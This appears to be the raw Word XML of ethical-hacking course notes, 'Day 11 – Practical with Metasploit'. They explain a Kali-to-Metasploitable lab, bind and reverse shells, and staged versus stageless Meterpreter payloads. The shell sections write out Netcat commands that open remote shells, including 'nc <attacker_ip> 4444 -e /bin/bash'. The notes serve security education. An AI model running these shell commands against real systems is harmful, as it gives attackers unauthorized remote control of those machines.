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E5720" w14:textId="72737051" w:rsidR="008F5DB5" w:rsidRPr="0082558E" w:rsidRDefault="00000000" w:rsidP="0082558E">
      <w:pPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:jc w:val="center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32"/>
        </w:rPr>
        <w:t xml:space="preserve">Day 11 – Practical with Metasploit </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4691268A" w14:textId="77777777" w:rsidR="008F5DB5" w:rsidRPr="0082558E" w:rsidRDefault="008F5DB5" w:rsidP="0082558E">
      <w:pPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="498053A6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1. Introduction</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B15E723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 xml:space="preserve">Today’s session was all about actually using Metasploit and other tools to interact with a target machine. </w:t>
      </w:r>
      <w:r w:rsidRPr="0082558E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:br/>
        <w:t>We focused on:</w:t>
      </w:r>
      <w:r w:rsidRPr="0082558E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:br/>
        <w:t>1. Setting up Metasploitable (our intentionally vulnerable target machine).</w:t>
      </w:r>
      <w:r w:rsidRPr="0082558E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:br/>
        <w:t>2. Learning about NAT networking and why it’s used.</w:t>
      </w:r>
      <w:r w:rsidRPr="0082558E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:br/>
        <w:t>3. Understanding bind shells and reverse shells using Netcat.</w:t>
      </w:r>
      <w:r w:rsidRPr="0082558E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:br/>
        <w:t>4. Learning staged vs. stageless payloads in Metasploit and how to identify them.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br/>
        <w:t>If you’re new to ethical hacking, this lesson is essential — it teaches how an attacker can get remote access to another machine and why different payload delivery methods exist.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72510FC4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2. What is Metasploitable?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2AD6BB2E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>Metasploitable is a deliberately vulnerable Linux machine created by Rapid7.</w:t>
      </w:r>
      <w:r w:rsidRPr="0082558E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:br/>
        <w:t>It is used for penetration testing practice.</w:t>
      </w:r>
      <w:r w:rsidRPr="0082558E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:br/>
        <w:t>Think of it as a “dummy target” — it’s like a crash test dummy for cybersecurity.</w:t>
      </w:r>
      <w:r w:rsidRPr="0082558E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:br/>
        <w:t>It contains weak passwords, outdated services, and security flaws that make it ideal for learning exploitation.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0AD7999F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3. Setting Up the Environment</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C2D2E4C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>We used two virtual machines:</w:t>
      </w:r>
      <w:r w:rsidRPr="0082558E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:br/>
        <w:t>- Attacker: Kali Linux</w:t>
      </w:r>
      <w:r w:rsidRPr="0082558E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:br/>
        <w:t>- Target: Metasploitable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br/>
        <w:t>Why Two Machines?</w:t>
      </w:r>
      <w:r w:rsidRPr="0082558E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:br/>
        <w:t>In real life, an attacker connects to a victim machine remotely over a network.</w:t>
      </w:r>
      <w:r w:rsidRPr="0082558E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:br/>
        <w:t>We simulate that in a safe environment by using Kali Linux (attacker) and Metasploitable (target).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C55E2AA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3.1 Connecting Both Machines</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45E5716B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lastRenderedPageBreak/>
        <w:t>We used NAT networking in VirtualBox.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br/>
        <w:t>NAT (Network Address Translation) means both machines share the same internet connection but are separated from the real internet.</w:t>
      </w:r>
      <w:r w:rsidRPr="0082558E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:br/>
        <w:t>They can talk to each other inside the virtual environment.</w:t>
      </w:r>
      <w:r w:rsidRPr="0082558E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:br/>
        <w:t>They can also access the internet if needed.</w:t>
      </w:r>
      <w:r w:rsidRPr="0082558E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:br/>
        <w:t>It’s safer than “Bridged” mode because external devices can’t reach them directly.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E3CF1A9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3.2 Finding IP Addresses</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="530FA76D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>On both Kali and Metasploitable, we typed:</w:t>
      </w:r>
      <w:r w:rsidRPr="0082558E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:br/>
        <w:t>ifconfig</w:t>
      </w:r>
      <w:r w:rsidRPr="0082558E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:br/>
        <w:t>This shows the machine’s network configuration, including its IP address (e.g., 10.0.2.15).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A96E1EF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3.3 Testing the Connection</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29663F6E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>To check if the two machines can talk:</w:t>
      </w:r>
      <w:r w:rsidRPr="0082558E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:br/>
        <w:t>ping &lt;target_ip&gt;</w:t>
      </w:r>
      <w:r w:rsidRPr="0082558E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:br/>
        <w:t>Example:</w:t>
      </w:r>
      <w:r w:rsidRPr="0082558E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:br/>
        <w:t>ping 10.0.2.15</w:t>
      </w:r>
      <w:r w:rsidRPr="0082558E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:br/>
        <w:t>If we get replies (64 bytes from ...), the connection works.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="529C1BE0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4. Introduction to Shells</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49E65410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>When we “get a shell” on another machine, it means:</w:t>
      </w:r>
      <w:r w:rsidRPr="0082558E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:br/>
        <w:t>- We have command-line access.</w:t>
      </w:r>
      <w:r w:rsidRPr="0082558E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:br/>
        <w:t>- We can type commands as if we were sitting at that machine.</w:t>
      </w:r>
      <w:r w:rsidRPr="0082558E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:br/>
        <w:t>- We can run commands like whoami to see which user we are.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br/>
        <w:t>Two main types for our lesson:</w:t>
      </w:r>
      <w:r w:rsidRPr="0082558E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:br/>
        <w:t>1. Bind Shell</w:t>
      </w:r>
      <w:r w:rsidRPr="0082558E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:br/>
        <w:t>2. Reverse Shell</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2433D509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5. Using Netcat (nc)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73809155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>Netcat is like a “Swiss Army knife” for networking:</w:t>
      </w:r>
      <w:r w:rsidRPr="0082558E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:br/>
        <w:t>- It can listen for connections.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lastRenderedPageBreak/>
        <w:t>- It can connect to another machine.</w:t>
      </w:r>
      <w:r w:rsidRPr="0082558E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:br/>
        <w:t>- It can even transfer files or execute commands remotely.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26546CA1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5.1 Bind Shell – Step-by-Step</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FD834FB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>In a bind shell:</w:t>
      </w:r>
      <w:r w:rsidRPr="0082558E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:br/>
        <w:t>- The target machine opens a port.</w:t>
      </w:r>
      <w:r w:rsidRPr="0082558E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:br/>
        <w:t>- The attacker connects to that port.</w:t>
      </w:r>
      <w:r w:rsidRPr="0082558E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:br/>
        <w:t>- Once connected, the attacker can type commands on the target.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br/>
        <w:t>Example:</w:t>
      </w:r>
      <w:r w:rsidRPr="0082558E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:br/>
        <w:t>Target (Metasploitable):</w:t>
      </w:r>
      <w:r w:rsidRPr="0082558E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:br/>
        <w:t>nc -lvnp 4444 -e /bin/bash</w:t>
      </w:r>
      <w:r w:rsidRPr="0082558E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:br/>
        <w:t>Attacker (Kali):</w:t>
      </w:r>
      <w:r w:rsidRPr="0082558E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:br/>
        <w:t>nc -v &lt;target_ip&gt; 4444</w:t>
      </w:r>
      <w:r w:rsidRPr="0082558E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:br/>
        <w:t>Once connected, running whoami shows the target’s username.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br/>
        <w:t>Security Note: Bind shells don’t work well if the target is behind a firewall that blocks incoming connections.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74754883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5.2 Reverse Shell – Step-by-Step</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="526BC6CB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>In a reverse shell:</w:t>
      </w:r>
      <w:r w:rsidRPr="0082558E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:br/>
        <w:t>- The attacker listens on a port.</w:t>
      </w:r>
      <w:r w:rsidRPr="0082558E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:br/>
        <w:t>- The target connects back to the attacker.</w:t>
      </w:r>
      <w:r w:rsidRPr="0082558E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:br/>
        <w:t>- Once connected, the attacker can type commands on the target.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br/>
        <w:t>Example:</w:t>
      </w:r>
      <w:r w:rsidRPr="0082558E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:br/>
        <w:t>Attacker (Kali):</w:t>
      </w:r>
      <w:r w:rsidRPr="0082558E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:br/>
        <w:t>nc -lvnp 4444</w:t>
      </w:r>
      <w:r w:rsidRPr="0082558E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:br/>
        <w:t>Target (Metasploitable):</w:t>
      </w:r>
      <w:r w:rsidRPr="0082558E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:br/>
        <w:t>nc &lt;attacker_ip&gt; 4444 -e /bin/bash</w:t>
      </w:r>
      <w:r w:rsidRPr="0082558E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:br/>
        <w:t>Now the attacker can run whoami and control the target’s system.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br/>
        <w:t>Advantage: Reverse shells often work better against firewalls since the target initiates the connection.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BB647AB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lastRenderedPageBreak/>
        <w:t>6. Metasploit Payloads – Staged vs. Stageless</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AE83081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 xml:space="preserve">A payload is the piece of code delivered to the target after exploitation. </w:t>
      </w:r>
      <w:r w:rsidRPr="0082558E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:br/>
        <w:t>It defines what you want to do after gaining access.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br/>
        <w:t>Staged Payload:</w:t>
      </w:r>
      <w:r w:rsidRPr="0082558E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:br/>
        <w:t>- Sent in two parts: stager + stage.</w:t>
      </w:r>
      <w:r w:rsidRPr="0082558E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:br/>
        <w:t>- Smaller initial code; bypasses size limits.</w:t>
      </w:r>
      <w:r w:rsidRPr="0082558E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:br/>
        <w:t>Example: windows/meterpreter/reverse_tcp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br/>
        <w:t>Stageless Payload:</w:t>
      </w:r>
      <w:r w:rsidRPr="0082558E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:br/>
        <w:t>- Sent all at once.</w:t>
      </w:r>
      <w:r w:rsidRPr="0082558E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:br/>
        <w:t>- Larger but more reliable if the connection might drop.</w:t>
      </w:r>
      <w:r w:rsidRPr="0082558E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:br/>
        <w:t>Example: windows/meterpreter_reverse_tcp</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6899A658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6.4 Key Differences</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="698F63F2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>| Feature        | Staged Payload                  | Stageless Payload             |</w:t>
      </w:r>
      <w:r w:rsidRPr="0082558E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:br/>
        <w:t>|---------------|--------------------------------|--------------------------------|</w:t>
      </w:r>
      <w:r w:rsidRPr="0082558E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:br/>
        <w:t>| Delivery      | Two parts                      | One part                       |</w:t>
      </w:r>
      <w:r w:rsidRPr="0082558E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:br/>
        <w:t>| Size          | Smaller first part             | Larger total size              |</w:t>
      </w:r>
      <w:r w:rsidRPr="0082558E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:br/>
        <w:t>| Reliability   | Needs stable connection        | Works with unstable connections|</w:t>
      </w:r>
      <w:r w:rsidRPr="0082558E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:br/>
        <w:t>| Stealth       | More stealthy                  | Less stealthy                  |</w:t>
      </w:r>
      <w:r w:rsidRPr="0082558E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:br/>
        <w:t>| Example       | windows/meterpreter/reverse_tcp| windows/meterpreter_reverse_tcp</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CFA1CEC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t>6.5 Listing Payloads</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="623453B0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>To see all payloads:</w:t>
      </w:r>
      <w:r w:rsidRPr="0082558E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:br/>
        <w:t>msfvenom -l payloads</w:t>
      </w:r>
      <w:r w:rsidRPr="0082558E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:br/>
        <w:t>To find only reverse TCP ones:</w:t>
      </w:r>
      <w:r w:rsidRPr="0082558E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:br/>
        <w:t>msfvenom -l payloads | grep "windows/meterpreter/reverse_tcp"</w:t>
      </w:r>
      <w:r w:rsidRPr="0082558E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="0082558E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:br/>
        <w:t>Tip:</w:t>
      </w:r>
      <w:r w:rsidRPr="0082558E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:br/>
        <w:t>- Slash (/) before reverse_tcp → staged payload.</w:t>
      </w:r>
      <w:r w:rsidRPr="0082558E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:br/>
        <w:t>- Underscore (_) before reverse_tcp → stageless payload.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C7B6B7F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  <w:b/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>7. Summary</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75D79178" w14:textId="77777777" w:rsidR="008F5DB5" w:rsidRPr="0082558E" w:rsidRDefault="00000000" w:rsidP="0082558E">
      <w:pPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0082558E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>Today you learned:</w:t>
      </w:r>
      <w:r w:rsidRPr="0082558E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:br/>
        <w:t>- How to connect Kali and Metasploitable using NAT.</w:t>
      </w:r>
      <w:r w:rsidRPr="0082558E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:br/>
        <w:t>- How to find and test IP connectivity.</w:t>
      </w:r>
      <w:r w:rsidRPr="0082558E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:br/>
        <w:t>- What bind shells and reverse shells are.</w:t>
      </w:r>
      <w:r w:rsidRPr="0082558E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:br/>
        <w:t>- How Netcat can be used for remote access.</w:t>
      </w:r>
      <w:r w:rsidRPr="0082558E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:br/>
        <w:t>- The difference between staged and stageless payloads in Metasploit.</w:t>
      </w:r>
    </w:p>
    <w:sectPr w:rsidR="008F5DB5" w:rsidRPr="008255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9657379">
    <w:abstractNumId w:val="8"/>
  </w:num>
  <w:num w:numId="2" w16cid:durableId="316031479">
    <w:abstractNumId w:val="6"/>
  </w:num>
  <w:num w:numId="3" w16cid:durableId="1999264029">
    <w:abstractNumId w:val="5"/>
  </w:num>
  <w:num w:numId="4" w16cid:durableId="1713264069">
    <w:abstractNumId w:val="4"/>
  </w:num>
  <w:num w:numId="5" w16cid:durableId="417946703">
    <w:abstractNumId w:val="7"/>
  </w:num>
  <w:num w:numId="6" w16cid:durableId="1033191598">
    <w:abstractNumId w:val="3"/>
  </w:num>
  <w:num w:numId="7" w16cid:durableId="1263565833">
    <w:abstractNumId w:val="2"/>
  </w:num>
  <w:num w:numId="8" w16cid:durableId="1172181702">
    <w:abstractNumId w:val="1"/>
  </w:num>
  <w:num w:numId="9" w16cid:durableId="14123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E3F"/>
    <w:rsid w:val="00034616"/>
    <w:rsid w:val="0006063C"/>
    <w:rsid w:val="0015074B"/>
    <w:rsid w:val="0029639D"/>
    <w:rsid w:val="00326F90"/>
    <w:rsid w:val="0082558E"/>
    <w:rsid w:val="008F5D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810DB"/>
  <w14:defaultImageDpi w14:val="300"/>
  <w15:docId w15:val="{4A0E7A82-8BCB-4FC1-AB57-F2F8647A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22-NTU-CS-1200</cp:lastModifiedBy>
  <cp:revision>2</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2013-12-23T23:15:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2025-08-09T11:13:00Z</dcterms:modified>
  <cp:category/>
</cp:coreProperties>
</file>